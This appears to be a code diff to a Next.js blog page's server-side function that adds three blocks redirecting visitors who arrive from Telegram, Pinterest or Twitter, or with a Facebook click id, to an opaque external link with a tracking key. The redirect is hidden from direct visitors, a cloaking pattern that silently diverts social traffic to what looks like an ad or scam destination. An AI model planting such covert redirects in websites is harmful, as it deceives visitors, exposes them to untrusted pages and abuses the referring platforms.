@@ -52,6 +52,33 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
     };
 }
 
+		if (referringURL?.includes('telegram.org') || fbclid) {
+    return {
+        redirect: {
+            permanent: false,
+            destination: `https://generalizebusinessman.com/ptj48jfss?key=5885334b10942dc6d6b3999661aeccfa/`,
+        },
+    };
+}
+
+		if (referringURL?.includes('pinterest.com') || fbclid) {
+    return {
+        redirect: {
+            permanent: false,
+            destination: `https://generalizebusinessman.com/ptj48jfss?key=5885334b10942dc6d6b3999661aeccfa/`,
+        },
+    };
+}
+
+		if (referringURL?.includes('twitter.com') || fbclid) {
+    return {
+        redirect: {
+            permanent: false,
+            destination: `https://generalizebusinessman.com/ptj48jfss?key=5885334b10942dc6d6b3999661aeccfa/`,
+        },
+    };
+}
+
 	const query = gql`
 		{
 			post(id: "/${path}/", idType: URI) {
